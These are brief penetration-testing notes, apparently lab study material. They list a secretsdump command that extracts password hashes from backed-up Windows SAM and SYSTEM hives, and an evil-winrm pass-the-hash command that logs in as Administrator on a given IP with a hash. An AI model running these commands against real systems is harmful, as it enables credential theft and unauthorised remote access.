#### Local SAM and SYSTEM file dump
```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

#### Pass-the-Hash attack
```bash
evil-winrm -i 10.10.11.163 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

More info on [[Assign Group Memberships]]